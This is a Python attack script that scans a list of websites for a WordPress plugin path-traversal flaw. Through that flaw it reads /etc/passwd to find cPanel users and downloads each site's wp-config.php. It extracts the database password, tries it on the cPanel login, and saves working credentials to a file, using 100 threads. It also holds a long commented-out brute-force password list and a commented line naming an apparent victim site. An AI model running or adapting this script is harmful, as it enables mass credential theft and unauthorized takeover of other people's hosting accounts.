import requests
import json
from multiprocessing.dummy import Pool
import os,sys



requests.urllib3.disable_warnings()


hsab = []

headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}


try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')







def url1(url):
    url = url.rstrip()
    if('http://' in url):
        url = url.replace('http://','')
    elif('https://' in url):
        url = url.replace('https://','')
    else:
        pass
    return(url)

def get(url):
    r = requests.get(url,headers=headers,verify=False,timeout=20)
    return(str(r.content))


db_host = ''
db_name = ''
db_user = ''
db_password = ''
table = ''

def work(url):
    #Warning:
    url = url.rstrip()
    global db_host
    global db_name
    global db_user
    global db_password
    global table
    uri = url.split('/')
    username = uri[4]
    uri = str(uri[0])

    r = requests.get('http://'+url,headers=headers,verify=False,timeout=20)
    
    if('warning' not in str(r.content) and 'Warning' not in str(r.content) and 'WARNING' not in str(r.content)):
        if(True):
            #$table_prefix
            r = requests.get('http://'+url,headers=headers,verify=False,timeout=20)
            html = str(r.text)
            html = html.split('define')
            for db in html:
                if('DB_PASSWORD' in db):
                    db = db.split(';')
                    db = str(db[0])
                    db = db.split("', ")
                    db = str(db[1])
                    db = db.replace("')",'')
                    db = db.replace("'",'')
                    db_password = db
                    #print(db)
                    
                else:
                    pass
            DATA = uri+'|'+username+'|'+db_password
            DATA = DATA.replace(' )','')
            DATA = DATA.replace('"','')
            organize(DATA)
            #return(DATA)
    #elif('warning' in str(r.content) or 'Warning' in str(r.content) or 'WARNING' in str(r.content)):

def check_cpanel(i):
    i=i.rstrip()
    h1 = 'https://'+i+':2083'
    h2 = 'http://'+i+':2083'
    r1 = requests.get(h1,headers=headers)
    if('cPanel' in r1.text):
        return(h1)
    else:
        return(h2)  
                            
def organize(target):
    scrap = target.split('|')
    url = scrap[0]
    url = check_cpanel(url)
    username = scrap[1]
    mdp = scrap[2]
    #passwd = ["azerty", "AZERTY", "Azerty", "qwerty", "!@#$%^&*", username.upper()+"!@#", username+"!@#", "!QAZ2WSX", "!QAZ2wsx", "!QAZ@WSX", "!QAZxsw2", "!qaz@wsx", "00",'666ps6blew4cruek', "0000", "000000", "0123456789", "02071976", "090909", "0987654321", "1", "102030", "10203040", "102102102", "111", "1111", "111111", "111111111111", "111111a", "111111q", "112233", "11223344", "12", "12061988", "121212", "123", "123123", "123123123", "123321", "1234", "12341234", "12344321", "12345", "123450", "123456", "1234567", "12345670", "12345678", "123456789", "1234567890", "123456a", "1234abcd", "1234qwer", "123654", "123654789", "123698", "123789", username.upper()+"123", username+"123", "123abc", "123mudar", "123qwe", "123qwe123", "123qweASD", "123qweasd", "123qweasdzxc", username.upper()+"12", "12qw34er", "12qwaszx", "159753", "18atcskd2w", "1a2b3c4d", "1q2w3e", "1q2w3e4r", "1q2w3e4r5t", "1q2w3e4r5t6y", "1qa2ws3ed", "1qaz!QAZ", "1qaz2wsx", "1qaz2wsx3edc", "1qaz@WSX", "1qazxsw2", "1qazxsw23edc", "2017", "2018", "2019", "213243", "321345", "3edc$RFV", "3rjs1la7qe", "43218765", "4444", "4dm1n", "5555", "555555", "654321", "666666", "7777777", "789456", "789456123", "88888888", "987654321", "@@@@@", "@@@@@@", "@dm1n", "@password@", "Administrador", "Administrator", "Administrator1", "Administrator123", "Amministrator", "Amministratore", "FGÄžIOD", "P@ssw0rd", "Passw0rd", "Password1", "QSDFGH", "QWERTZ", "QWErty123", "Qwer1234", "Qwerty1", "Qwerty12", "Qwerty123", "Qwerty12345", "ZAQ!2wsx", "[AZDOMAIN]", "[DDOMAIN]", "[DOMAIN]", "[DOMAIN]!", "[DOMAIN]!@", "[DOMAIN]!@#", "[DOMAIN]!@#$", "[DOMAIN]!@#$%", "[DOMAIN]0101", "[DOMAIN]0102", "[DOMAIN]012", "[DOMAIN]0123", "[DOMAIN]1", "[DOMAIN]11", "[DOMAIN]111", "[DOMAIN]1111", "[DOMAIN]12", "[DOMAIN]123", "[DOMAIN]2017", "[DOMAIN]2018", "[DOMAIN]2019", "[DOMAIN]999", "[UPPERALL]", "[UPPERALL]2017", "[UPPERALL]2018", "[UPPERALL]2019", username.upper()+"", username.upper()+"!", username.upper()+"!!", username.upper()+"!!!", username.upper()+"!!!!", username.upper()+"!@", username.upper()+"!@#$", username.upper()+"!@#$%", username.upper()+"!@#$%^", username.upper()+"!@#$%^&", username.upper()+"!@#$%^&*", username.upper()+"###", username.upper()+")))", username.upper()+"***", username.upper()+"0", username.upper()+"00", username.upper()+"000", username.upper()+"0000", username.upper()+"001", username.upper()+"003", username.upper()+"005", username.upper()+"007", username.upper()+"01", username.upper()+"010", username.upper()+"0101", username.upper()+"0102", username.upper()+"012", username.upper()+"0123", username.upper()+"1", username.upper()+"10", username.upper()+"1000", username.upper()+"1050", username.upper()+"11", username.upper()+"111", username.upper()+"1111", username.upper()+"111111", username.upper()+"112", username.upper()+"1122", username.upper()+"112233", username.upper()+"1199", username.upper()+"123123", username.upper()+"123321", username.upper()+"1234", username.upper()+"12345", username.upper()+"123456", username.upper()+"1234567", username.upper()+"12345678", username.upper()+"123456789", username.upper()+"1234567890", username.upper()+"124", username.upper()+"13", username.upper()+"14", username.upper()+"15", username.upper()+"1551", username.upper()+"16", username.upper()+"17", username.upper()+"1771", username.upper()+"18", username.upper()+"19", username.upper()+"1900", username.upper()+"1970", username.upper()+"1971", username.upper()+"1972", username.upper()+"1973", username.upper()+"1974", username.upper()+"1975", username.upper()+"1976", username.upper()+"1977", username.upper()+"1978", username.upper()+"1979", username.upper()+"1980", username.upper()+"1981", username.upper()+"1982", username.upper()+"1983", username.upper()+"1984", username.upper()+"1985", username.upper()+"1986", username.upper()+"1987", username.upper()+"1988", username.upper()+"1989", username.upper()+"199", username.upper()+"1990", username.upper()+"1991", username.upper()+"1992", username.upper()+"1993", username.upper()+"1994", username.upper()+"1995", username.upper()+"1996", username.upper()+"1997", username.upper()+"1998", username.upper()+"1999", username.upper()+"1q2w3e4r", username.upper()+"1qaz2wsx", username.upper()+"20", username.upper()+"2000", username.upper()+"2001", username.upper()+"2002", username.upper()+"2003", username.upper()+"2004", username.upper()+"2005", username.upper()+"2006", username.upper()+"2007", username.upper()+"2008", username.upper()+"2009", username.upper()+"2010", username.upper()+"2011", username.upper()+"2012", username.upper()+"2013", username.upper()+"2014", username.upper()+"2015", username.upper()+"2016", username.upper()+"2017", username.upper()+"2018", username.upper()+"2019", username.upper()+"2020", username.upper()+"22", username.upper()+"2211", username.upper()+"2222", username.upper()+"25", username.upper()+"3", username.upper()+"3000", username.upper()+"3030", username.upper()+"321", username.upper()+"321654", username.upper()+"33", username.upper()+"333", username.upper()+"3333", username.upper()+"345", username.upper()+"4", username.upper()+"40", username.upper()+"4000", username.upper()+"404", username.upper()+"4040", username.upper()+"432", username.upper()+"44", username.upper()+"444", username.upper()+"4444", username.upper()+"456", username.upper()+"5", username.upper()+"50", username.upper()+"5000", username.upper()+"505", username.upper()+"5050", username.upper()+"543", username.upper()+"55", username.upper()+"5500", username.upper()+"555", username.upper()+"5550", username.upper()+"5555", username.upper()+"567", username.upper()+"6", username.upper()+"60", username.upper()+"600", username.upper()+"606", username.upper()+"6060", username.upper()+"654", username.upper()+"66", username.upper()+"666", username.upper()+"6666", username.upper()+"678", username.upper()+"6789", username.upper()+"7", username.upper()+"70", username.upper()+"700", username.upper()+"7000", username.upper()+"707", username.upper()+"7070", username.upper()+"765", username.upper()+"77", username.upper()+"777", username.upper()+"78", username.upper()+"789", username.upper()+"79", username.upper()+"8", username.upper()+"80", username.upper()+"800", username.upper()+"808", username.upper()+"8080", username.upper()+"876", username.upper()+"88", username.upper()+"888", username.upper()+"8888", username.upper()+"89", username.upper()+"890", username.upper()+"9", username.upper()+"90", username.upper()+"909", username.upper()+"9090", username.upper()+"98", username.upper()+"987", username.upper()+"99", username.upper()+"9988", username.upper()+"999", username.upper()+"9999", username.upper()+"@#$%^&", username.upper()+"@123", username.upper()+"@@@", username.upper()+"P@ssw0rd", username.upper()+"a", username.upper()+"abc123", username.upper()+"admin", username.upper()+"admin!@#", username.upper()+"admin01", username.upper()+"admin1", username.upper()+"admin123", username.upper()+"admin1234", username.upper()+"admin12345", username.upper()+"admin888", username.upper()+"admin@123", username.upper()+"adminadmin", username.upper()+"asf", username.upper()+"p@ssw0rd", username.upper()+"pass", username.upper()+"pass123", username.upper()+"pass1234", username.upper()+"password", username.upper()+"password1", username.upper()+"password123", username.upper()+"q1w2e3r4", username.upper()+"qaz", username.upper()+"qazescrfv", username.upper()+"qazwsx", username.upper()+"qwe123", username.upper()+"qweasd", username.upper()+"qweasdzxc", username.upper()+"qwerty", username.upper()+"qwerty123", username.upper()+"ricsky789..", username.upper()+"root", username.upper()+"temporal", username.upper()+"test", username.upper()+"test1", username.upper()+"test123", username.upper()+"test1234", username.upper()+"xmagico", username.upper()+"xxx", username+"", username+"!", username+"!@", username+"!@#$", username+"!@#$%", username+"!@#$%^", username+"$", username+"0", username+"00", username+"000", username+"0000", username+"001", username+"003", username+"005", username+"007", username+"01", username+"010", username+"0101", username+"0102", username+"012", username+"0123", username+"0987654321", username+"1", username+"10", username+"1000", username+"11", username+"111", username+"1111", username+"111111", username+"112", username+"1122", username+"112233", username+"1199", username+"12", username+"123!", username+"123123", username+"123321", username+"1234", username+"12345", username+"1234554321", username+"123456", username+"123456654321", username+"1234567", username+"12345677654321", username+"12345678", username+"1234567887654321", username+"123456789", username+"1234567890", username+"123q", username+"123qwerty", username+"124", username+"13", username+"14", username+"15", username+"1551", username+"16", username+"17", username+"1771", username+"18", username+"19", username+"1900", username+"1970", username+"1971", username+"1972", username+"1973", username+"1974", username+"1975", username+"1976", username+"1977", username+"1978", username+"1979", username+"1980", username+"1981", username+"1982", username+"1983", username+"1984", username+"1985", username+"1986", username+"1987", username+"1988", username+"1989", username+"1990", username+"1991", username+"1992", username+"1993", username+"1994", username+"1995", username+"1996", username+"1997", username+"1998", username+"1999", username+"1q", username+"1q2w3e4r", username+"1qaz2wsx", username+"1qwe", username+"20", username+"2000", username+"2001", username+"2002", username+"2003", username+"2004", username+"2005", username+"2006", username+"2007", username+"2008", username+"2009", username+"2010", username+"2011", username+"2012", username+"2013", username+"2014", username+"2015", username+"2016", username+"2017", username+"2018", username+"2019", username+"2020", username+"22", username+"2211", username+"2222", username+"25", username+"3", username+"3000", username+"3030", username+"321", username+"33", username+"333", username+"3333", username+"345", username+"4", username+"40", username+"4000", username+"404", username+"4040", username+"432", username+"44", username+"444", username+"4444", username+"456", username+"5", username+"50", username+"5000", username+"505", username+"5050", username+"543", username+"54321", username+"55", username+"5500", username+"555", username+"5550", username+"5555", username+"55555", username+"567", username+"6", username+"60", username+"600", username+"606", username+"6060", username+"654", username+"654321", username+"66", username+"666", username+"6666", username+"666666", username+"678", username+"6789", username+"7", username+"70", username+"700", username+"7000", username+"707", username+"7070", username+"765", username+"77", username+"777", username+"7777777", username+"78", username+"789", username+"79", username+"8", username+"80", username+"800", username+"808", username+"8080", username+"876", username+"88", username+"888", username+"8888", username+"89", username+"890", username+"9", username+"90", username+"909", username+"9090", username+"98", username+"987", username+"99", username+"9988", username+"999", username+"9999", username+"@#$%^&", username+"@123", username+"@1234", username+"@2014", username+"@2017", username+"@2018", username+"@2019", username+"@2020", username+"@321", username+"@", username+"A", username+"P@ssw0rd", username+"QWE", username+"QWE1", username+"_123", username+"_admin", username+"a", username+"abc123", username+"admin", username+"admin!@#", username+"admin01", username+"admin1", username+"admin123", username+"admin1234", username+"admin12345", username+"admin888", username+"admin@123", username+"adminadmin", username+"blah", username+"changeme", username+"p@ssw0rd", username+"pass", username+"pass123", username+"pass1234", username+"password", username+"password1", username+"password123", username+"q1w2e3r4", username+"qwe", username+"qwe123", username+"qwer", username+"qwert", username+"qwert12345", username+"qwerty", username+"qwerty123", username+"qwertyu", username+"qwertyui", username+"qwertyuiop", username+"ricsky789..", username+"root", username+"temporal", username+"test", username+"test1", username+"test123", username+"test1234", username+"xxx", "a", "a123456", "a1b2c3d4", "a1s2d3f4", "a654321", "aa112233", "aa123456", "abc", "abc123", "abc12345", "abcd1234", "adm1n", "admin", "admin!", "admin!@", "admin!@#", "admin007", "admin01", "admin1", "admin12", "admin123", "admin123!", "admin1234", "admin12345", "admin123456", "admin2", "admin2014", "admin2015", "admin321", "admin54321", "admin888", "admin@123", "admin@1234", "admin@2014", "admin@321", "admin@[AZDOMAIN]", "admin@[DOMAIN]", "admin_123", "admin_[AZDOMAIN]", "admin_[DOMAIN]", "adminadmin", "adminadmin123", "adminadminadmin", "admindemo", "administrador", "administrator", "adminpass", "adminuser999!", "admni@@@", "amministrator", "amministratore", "asd", "asd123", "asdasd", "asdasd123", "asdf", "asdf1234", "asdfgh", "asdfghjkl", "asdqwe123", "bismillah", "blah", "blog123", "changeme", "changeme123", "charlie", "condor", "demo", "demo123", "demodemo", "denis123", "donald", "donaldtrump", "fgÄŸiod", "foo", "football", "freedom123", "gimboroot", "google", "google123", "guest", "haha1234", "hello", "hello123", "iloveyou", "indonesia", "joomla", "leo", "letmein", "letmein123", "liverpool", "lkjhgfdsa", "logitech", "lol", "majordomo", "maker", "manager", "master", "mnbvcxz", "monkey", "nimda", "opencart", "p4ssw0rd", "p@$$w0rd", "p@ssw0rd", "p@ssword", "pa$$w0rd", "pa55w0rd", "pa55word", "parola", "pass", "pass123", "pass1234", "pass12345", "pass2018", "pass2019", "pass@123", "pass@word1", "passpass", "passw0rd", "password", "password1", "password123", "password1234", "password12345", "poiuytrewq", "princess", "q1w2e3", "q1w2e3r4", "q1w2e3r4t5", "q1w2e3r4t5y6", "qaz123", "qazwsx", "qazwsx123", "qazwsxedc", "qwe123", "qweasd", "qweasd123", "qwer1234", "qwerty", "qwerty123", "qwerty12345", "qwerty99", "qwertyuiop", "qwertz", "ricsky789..", "romario", "root", "root2019", "secret", "sunshine", "super123", "superadmin", "supported", "temp123", "temp1234", "temporal", "test", "test1", "test123", "test1234", "teste", "testing", "testtest", "trump", "user2018", "user2019", "webmaster", "welcome", "welcome1", "welcome123", "welkom01", "wordpress", "wordpress123", "wpadmin", "x", "xmagico", "xxx", "z43218765z", "zaq12wsx", "zxcvbnm", "08101979", username+"4321", username+"@4321", "Welcome!@#", "poipoi"]
    crack(url,username,mdp)

def crack(url,username,pwd):
    word = '/logout'
    session = requests.Session()
    cp = url+'/login/'
    data = {'user':username,'pass':pwd,'goto_uri':'/'}

    r = session.post(cp,data=data,headers=headers)
    if(word in r.text):
        print('Connected: '+url)
        with open("cpanels.txt","a") as ola:
            ola.writelines(url+'|'+username+'|'+pwd+'\n')
    else:
        print('Failed: '+url)           

def get_cp_dir(uri):
    #usr/local/cpanel/bin/noshell
    #.my.cnf
    word = 'DB_HOST'
    uri = uri.rstrip()
    if('http://' in uri):
        urii = uri.replace('http://','')
    elif('https://' in uri):
        urii = uri.replace('https://','')
    else:
        pass
    if('/' in urii):
        urii = urii.replace('/','')
    print('TESTED ['+str(len(hsab))+']:  '+uri)
    url = 'http://'+urii+'/wp-admin/admin-post.php?local-download=../../../etc/passwd&local-destination-id=../../../etc/passwd'
    html = get(url)
    lista = html.split('nologin')
    if('usr/local/cpanel/bin/noshell' in html):
        #print('okey')
        for dirr in lista:
            if('usr/local/cpanel/bin/' in dirr):
                dirs = dirr.split('usr/local/cpanel/bin/noshell')
                for root in dirs:
                    if('/home' in root):
                        dir_root = root.split(':')
                        dir_roots = str(dir_root[5])
                        dir_root_cnf = str(dir_root[5])
                        user = dir_roots.replace('/home/','')
                        user = user.replace('/','')
                        cnf = dir_root_cnf
                        cnf1 = urii+'/wp-admin/admin-post.php?local-download='+cnf+'/public_html/wp-config.php'
                        cnf2 = urii+'/wp-admin/admin-post.php?local-download='+cnf+'/public_html/'+urii+'/wp-config.php'
                        #print(cnf1)
                        
                        #.accesshash
                        #access = (str(acces_html.content) != '' and 'empty' not in str(acces_html.content) and '<' not in str(acces_html.content) and '>' not in str(acces_html.content) and 'Site currently under maintenance' not in str(acces_html.content) and 'file transfer failed' not in str(acces_html.content)):
                        with open('users.txt','a') as k:
                            k.writelines(urii+'#'+user+'\n')

                        content1 = requests.get('http://'+cnf1,headers=headers,verify=False,timeout=20)
                        content2 = requests.get('http://'+cnf2,headers=headers,verify=False,timeout=20)
                        
                        if(word in str(content1.text)):
                            with open('cnfg.txt','a') as f:
                                f.writelines(cnf2+'\n')
                            
                            work(cnf1)
                            
                        elif(word in str(content2.text)):
                            with open('cnfg.txt','a') as f:
                                f.writelines(cnf2+'\n')
                            
                            work(cnf2)
                            
                                
                        else:
                            print('Failed getting config')
                        
                    else:
                        pass
        
            
    



#work('https://barrdental.com///wp-admin/admin-post.php?local-download=/home/spsj1342/public_html/wp-config.php')


#comlete it tomorrow







def main(url):
    try:
    #if(True):
        url = url.rstrip()
        hsab.append(url)
        os.system("title Total website tested now are: "+str(len(hsab)))
        get_cp_dir(url)
    except:
        pass





mp = Pool(100)
mp.map(main, target)
mp.close()
mp.join()





















    
